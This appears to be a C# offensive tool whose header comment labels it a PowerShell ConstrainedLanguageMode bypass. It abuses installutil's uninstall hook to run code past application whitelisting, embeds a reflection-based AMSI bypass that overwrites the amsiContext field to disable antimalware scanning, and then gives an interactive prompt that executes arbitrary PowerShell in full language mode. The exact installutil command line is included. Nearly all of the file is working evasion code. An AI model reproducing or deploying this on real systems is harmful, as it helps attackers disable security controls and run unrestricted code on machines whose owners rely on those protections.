/*
ConstrainedLanguageMode Bypass
Program which when uninstalled with installutil will prompt user for powershell commands and execute them in FullLanguageMode.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U CLMBypass.exe
*/

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello, World!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;

                    // AMSI bypass
                    Setup(ps);

                    // Command loop
                    while (true)
                    {
                        Console.Write($"PS {Directory.GetCurrentDirectory()}> ");
                        string cmd = Console.ReadLine();
                        if (string.Equals(cmd, "exit", StringComparison.OrdinalIgnoreCase))
                        {
                            break;
                        }
                        else if (string.IsNullOrWhiteSpace(cmd))
                        {
                            continue;
                        }

                        ps.Commands.Clear();
                        ps.AddScript(cmd);
                        ps.AddCommand("Out-String");

                        try
                        {
                            var results = ps.Invoke();
                            if (ps.Streams.Error.Count > 0)
                            {
                                LogErrors(ps.Streams.Error);
                                ps.Streams.Error.Clear();
                            }
                            Console.WriteLine(string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray()));
                        }
                        catch (Exception ex)
                        {
                            LogException(ex);
                        }
                    }
                }
            }
        }

        // Helper methods
        private void Setup(PowerShell ps)
        {
            // AMSI Bypass script
            string initScript = @"
                $a = [Ref].Assembly.GetTypes();
                foreach ($b in $a) {
                    if ($b.Name -like '*iUtils') {
                        $c = $b
                    }
                }
                $d = $c.GetFields('NonPublic,Static');
                foreach ($e in $d) {
                    if ($e.Name -like '*Context') {
                        $f = $e
                    }
                }
                $g = $f.GetValue($null);
                [IntPtr]$ptr = $g;
                [Int32[]]$buf = @(0);
                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);";

            try
            {
                ps.AddScript(initScript);
                ps.Invoke();
                if (ps.Streams.Error.Count > 0)
                {
                    LogErrors(ps.Streams.Error);
                }
            }
            catch (Exception ex)
            {
                LogException(ex);
                return;
            }
        }


        private void LogErrors(IEnumerable<object> errors)
        {
            try
            {
                foreach (var error in errors)
                {
                    Console.WriteLine($"[-] Error: {error}");
                }
            }
            catch
            {
                Console.WriteLine("[-] Could not log error!");
            }
        }

        private void LogException(Exception ex)
        {
            try
            {
                Console.WriteLine($"[-] Exception: {ex.Message}");
            }
            catch
            {
                Console.WriteLine("[-] Could not log exception!");
            }
        }
    }
}

